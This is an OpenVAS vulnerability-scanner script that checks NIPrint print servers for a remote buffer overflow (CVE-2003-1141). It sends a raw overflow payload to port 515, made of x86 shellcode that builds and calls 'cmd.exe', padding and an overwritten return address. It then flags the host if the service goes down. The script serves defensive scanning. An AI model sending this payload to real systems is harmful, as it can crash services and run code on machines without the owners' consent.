# OpenVAS Vulnerability Test
# $Id: niprint_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: NIPrint LPD-LPR Print Server
#
# Authors:
# Matt North
#
# Copyright:
# Copyright (C) 2003 Matt North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "A vulnerability in the NIPrint could allow an attacker to remotely 
overflow an internal buffer which could allow code execution.";

tag_solution = "None, Contact the vendor http://www.networkinstruments.com/products/niprint.html";

if(description) 
{ 
	script_oid("1.3.6.1.4.1.25623.1.0.11926"); 
	script_version("$Revision: 9348 $");
	script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
	script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
	script_cve_id("CVE-2003-1141");
	script_bugtraq_id(8968);
	script_xref(name:"OSVDB", value:"2774");
    script_tag(name:"cvss_base", value:"7.5");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
        
      name = "NIPrint LPD-LPR Print Server"; 
      script_name(name); 

      summary = "Checks for vulnerable NIPrint";
	script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
	script_copyright("This script is Copyright (C) 2003 Matt North");
	family = "Denial of Service";
	script_family(family);

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
	exit(0);
}

port = 515;
if (! get_port_state(port)) exit(0);

r = raw_string( 0x90,0xCC,0x90,0x90,0x90,0x90,0x8B,0xEC,0x55,0x8B,0xEC,0x33,0xFF,0x57,0x83,0xEC,0x04,0xC6,0x45,0xF8,0x63
,0xC6, 0x45, 0xF9, 0x6D,0xC6,0x45,0xFA,0x64,0xC6,0x45,0xFB,0x2E,0xC6,0x45,0xFC,0x65,0xC6,0x45,0xFD,0x78,
0xC6,0x45,0xFE,0x65,0xB8,0xC3,0xAF,0x01,0x78,0x50,0x8D,0x45,0xF8,0x50,0xFF,0x55,0xF4,0x5F);

r1 = raw_string( 0xCC, 0x83,0xC4,0x04, 0xFF,0xE4);
r2 = string(crap(43));
r3 = raw_string( 0xcb, 0x50, 0xf9, 0x77);
bo = r + r1 + r2 + r3;

soc = open_priv_sock_tcp(dport: port);
if(!soc) exit(0);

send(socket:soc,data:bo);

close(soc);
alive = open_priv_sock_tcp(dport: port);
if (!alive) security_message(port);

